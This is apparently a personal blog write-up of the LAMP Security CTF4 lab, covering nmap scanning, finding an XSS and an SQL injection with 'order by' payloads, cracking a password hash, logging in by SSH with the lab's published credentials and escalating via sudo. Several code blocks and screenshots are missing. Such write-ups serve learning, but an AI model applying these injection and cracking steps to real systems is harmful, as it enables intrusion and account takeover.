Hi everyone. This is my solution for LAMP security CTF4. This CTF is very easy, you can download it from [Vulnhub.com](https://vulnhub.com) or play online on [root-me.org](https://root-me.org). I did it on root-me, therefore my target was ctf07.root-me.org.

Ok let‚Äôs start, i ran nmap to see which services were open (usually I run a second scan with ‚Äú-p 1-65535‚Äù parameter to identify all the ports).

~~~
Syrion:~ syrion$ sudo nmap -sT -sV -O ctf07.root-me.org
Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2016-10-07 21:19 CEST

At this point I used netcat to verify the services on the three open ports. As excepted:

* SSH on 22
* SENDMAIL on 25
* HTTP on 80

In the meantime,  I ran DirBuster, and I noticed this file:

It was the database‚Äôs structure:

![Screenshot]({{ site.baseurl }}/images/posts/2017/2017-12-20-lamp-security-ctf4-writeup/img2.png)

This was the website on port 80:

I noticed this xss on the search bar:

Then I found an SQL Injection on the blog:

![Screenshot]({{ site.baseurl }}/images/posts/2017/2017-12-20-lamp-security-ctf4-writeup/img5.png)

At this pont I started to enumerate the select statement‚Äôs parameters by using this payloads:

* id=1 order by 1 ‚Äî
* id=1 order by 2 ‚Äî

They were five!

I needed to know which parameters were visible:

And then I performed the full SQL Inection (i knew the database structure because of db.sql):

Ok let‚Äôs use [crackstation](https://crackstation.net/) to crack the hash. I tried to login as dstevens via ssh with the following credentials:

~~~
username dstevens
password: ilike2surf
~~~

And I succeeded:

~~~
Syrion:~ syrion$ ssh dstevens@ctf07.root-me.org

I tried to run ‚Äúsudo su‚Äù and yes‚Ä¶ it worked (LOL):

~~~

The privilege escalation was very very‚Ä¶very easy üòõ

Bye bye!
